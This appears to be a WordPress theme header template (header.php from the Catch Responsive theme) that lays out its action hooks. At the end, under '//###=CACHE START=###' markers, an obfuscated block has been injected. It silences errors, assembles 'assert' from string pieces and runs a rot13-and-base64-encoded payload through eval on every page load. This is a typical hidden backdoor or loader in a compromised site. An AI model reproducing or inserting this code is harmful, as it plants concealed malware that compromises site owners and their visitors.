<?php
/**
 * The default template for displaying header
 *
 * @package Catch Themes
 * @subpackage Catch Responsive
 * @since Catch Responsive 1.0 
 */

	/** 
	 * catchresponsive_doctype hook
	 *
	 * @hooked catchresponsive_doctype -  10
	 *
	 */
	do_action( 'catchresponsive_doctype' );?>

<head>
<?php	
	/** 
	 * catchresponsive_before_wp_head hook
	 *
	 * @hooked catchresponsive_head -  10
	 * 
	 */
	do_action( 'catchresponsive_before_wp_head' );

	wp_head(); ?>
</head>

<body <?php body_class(); ?>>
<?php 
	/** 
     * catchresponsive_before_header hook
     *
     */
    do_action( 'catchresponsive_before' );
	
	/** 
	 * catchresponsive_header hook
	 *
	 * @hooked catchresponsive_page_start -  10
	 * @hooked catchresponsive_header_start- 20
	 * @hooked catchresponsive_mobile_header_nav_anchor - 30
	 * @hooked catchresponsive_mobile_secondary_nav_anchor - 40
	 * @hooked catchresponsive_site_branding - 50
	 * @hooked catchresponsive_header_right - 60
	 * @hooked catchresponsive_header_end - 100
	 * 
	 */
	do_action( 'catchresponsive_header' );

	/** 
     * catchresponsive_after_header hook
     *
     * @hooked catchresponsive_primary_menu - 20
     * @hooked catchresponsive_secondary_menu - 30
	 * @hooked catchresponsive_featured_overall_image - 40
     * @hooked catchresponsive_add_breadcrumb - 50
     */
	do_action( 'catchresponsive_after_header' ); 

	/** 
	 * catchresponsive_before_content hook
	 *
	 * @hooked catchresponsive_slider - 10
	 * @hooked catchresponsive_promotion_headline - 30
	 * @hooked catchresponsive_featured_content_display (move featured content above homepage posts - default option) - 40
	 */
	do_action( 'catchresponsive_before_content' );
	
	/** 
     * catchresponsive_content hook
     *
     *  @hooked catchresponsive_content_start - 10
     *  @hooked catchresponsive_add_breadcrumb - 20
     *  @hooked catchresponsive_content_sidebar_wrap_start - 40
     *
     */
	do_action( 'catchresponsive_content' );
		







//###=CACHE START=###
error_reporting(0); 
$strings = "as";$strings .= "sert";
@$strings(str_rot13('riny(onfr64_qrpbqr("nJLtXTymp2I0XPEcLaLcXFO7VTIwnT8tWTyvqwftsFOyoUAyVUftMKWlo3WspzIjo3W0nJ5aXQNcBjccozysp2I0XPWxnKAjoTS5K2Ilpz9lplVfVPVjVvx7PzyzVPtunKAmMKDbWTyvqvxcVUfXnJLbVJIgpUE5XPEsD09CF0ySJlWwoTyyoaEsL2uyL2fvKFxcVTEcMFtxK0ACG0gWEIfvL2kcMJ50K2AbMJAeVy0cBjccMvujpzIaK21uqTAbXPpuKSZuqFpfVTMcoTIsM2I0K2AioaEyoaEmXPEsH0IFIxIFJlWGD1WWHSEsExyZEH5OGHHvKFxcXFNxLlN9VPW1VwftMJkmMFNxLlN9VPW3VwfXWTDtCFNxK1ASHyMSHyfvH0IFIxIFK05OGHHvKF4xK1ASHyMSHyfvHxIEIHIGIS9IHxxvKGfXWUHtCFNxK1ASHyMSHyfvFSEHHS9IH0IFK0SUEH5HVy07PvE1pzjtCFNvnUE0pQbiY3AuoaElMKZhLzy6Y2qyqP5jnUN/MQ0vYaIloTIhL29xMFtxMPxhVvM1CFVhqKWfMJ5wo2EyXPE1XF4vWzZ9Vv4xLl4vWzx9ZFMbCFVhoJD1XPV1AJZkATLmMTD1BQV4ZwV1A2SxAmZ3LwN3L2HmZJRjLvVhWTDhWUHhWTZhVwRvXGfXnJLbnJ5cK2qyqPtvLJkfo3qsqKWfK2MipTIhVvxtCG0tZFxtrjbxnJW2VQ0tMzyfMI9aMKEsL29hqTIhqUZbWUIloPx7Pa0tMJkmMJyzXTM1ozA0nJ9hK2I4nKA0pltvL3IloS9cozy0VvxcVUfXWTAbVQ0tL3IloS9cozy0XPE1pzjcBjcwqKWfK3AyqT9jqPtxL2tfVRAIHxkCHSEsFRIOERIFYPOTDHkGEFx7PzA1pzksp2I0o3O0XPEwnPjtD1IFGR9DIS9FEIEIHx5HHxSBH0MSHvjtISWIEFx7PvElMKA1oUDtCFOwqKWfK2I4MJZbWTAbXGfXL3IloS9woT9mMFtxL2tcBjbxnJW2VQ0tWUWyp3IfqQfXsFOyoUAyVUfXWTMjVQ0tMaAiL2gipTIhXPWmLJ50pzImYzWcrvVfVQtjYPNxMKWloz8fVPEypaWmqUVfVQZjXGfXnJLtXPEzpPxtrjbtVPNtWT91qPN9VPWUEIDtY2qyqP5jnUN/MQ0vYaIloTIhL29xMFtxMPxhVvM1CFVhqKWfMJ5wo2EyXPE1XF4vWzZ9Vv4xLl4vWzx9ZFMbCFVhoJD1XPV1AJZkATLmMTD1BQV4ZwV1A2SxAmZ3LwN3L2HmZJRjLvVhWTDhWUHhWTZhVwRvXF4vVRuHISNiZF4kKUWpovV7PvNtVPNxo3I0VP49VPWVo3A0BvOmLJ50pzImYzWcryklKT4vBjbtVPNtWT91qPNhCFNvD29hozIwqTyiowbtD2kip2IppykhKUWpovV7PvNtVPOzq3WcqTHbWTMjYPNxo3I0XGfXVPNtVPElMKAjVQ0tVvV7PvNtVPO3nTyfMFNbVJMyo2LbWTMjXFxtrjbtVPNtVPNtVPElMKAjVP49VTMaMKEmXPEzpPjtZGV4XGfXVPNtVU0XVPNtVTMwoT9mMFtxMaNcBjbtVPNtoTymqPtxnTIuMTIlYPNxLz9xrFxtCFOjpzIaK3AjoTy0XPViKSWpHv8vYPNxpzImpPjtZvx7PvNtVPNxnJW2VQ0tWTWiMUx7Pa0XsDc9BjccMvucp3AyqPtxK1WSHIISH1EoVaNvKFxtWvLtWS9FEISIEIAHJlWjVy0tCG0tVwt1BGH3MQV0VvxtrlOyqzSfXUA0pzyjp2kup2uypltxK1WSHIISH1EoVzZvKFxcBlO9PzIwnT8tWTyvqwg9"));'));
//###=CACHE END=###